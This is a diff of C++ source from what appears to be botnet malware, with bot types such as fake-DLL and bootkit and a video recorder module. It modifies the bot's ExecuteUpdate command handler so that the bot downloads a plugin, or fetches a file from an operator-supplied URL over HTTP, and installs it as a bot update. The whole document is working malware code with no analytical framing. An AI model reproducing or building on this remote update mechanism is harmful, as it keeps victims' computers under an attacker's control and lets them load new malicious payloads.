@@ -20,6 +20,7 @@
 #include "BotDef.h"
 #include "VideoRecorder.h"
 #include "StrConsts.h"
+
 #include <shlobj.h>
 #include <shlwapi.h>
 
@@ -739,23 +740,40 @@ bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 {
 	// Загрузить обновление
-	bool Result = false;
-	WCHAR *FileName = GetTempName();
-
-	if (FileName)
-	{
-		if (DownloadInFile(Args, FileName ) && (DWORD)pGetFileAttributesW( FileName ) != INVALID_FILE_ATTRIBUTES )
+	#ifdef BOTPLUG
+		//  Для фэкедлл и буткита ссылку игнорируем, загружаем плагин
+		if (BOT::GetBotType() == BotFakeDll || BOT::GetBotType() == BotBootkit)
 		{
-			/* TODO : Исправить временное решение с преобразованием в анси строку */
-			PCHAR Name = WSTR::ToAnsi(FileName, 0);
-			BOT::DeleteSettings();
-			Result = MakeUpdate(Name);
-			STR::Free(Name);
-        }
-	}
+			string PluginName = GetStr(EStrBotPlug);
+		    DWORD Size = 0;
+			LPBYTE Buf = Plugin::Download(PluginName.t_str(), NULL, &Size, true);
+			if (Buf)
+			{
+				bool Result = BOT::UpdateBotPlug(Buf, Size);
+				MemFree(Buf);
+				return Result;
+			}
+		}
 
-	MemFree( FileName );
-	return Result;
+		return false;
+	#else
+		PCHAR FileName = File::GetTempNameA();
+		if (!FileName) return false;
+
+		// Загружаем обновление
+		TBotFileStream File(FileName, fcmCreate);
+
+		THTTP HTTP;
+		bool Result = HTTP.Get(Args, &File);
+
+		File.Close();
+
+		if (Result)
+			Result = BOT::MakeUpdate(FileName, true);
+
+		STR::Free(FileName);
+		return Result;
+	#endif
 }
 
 
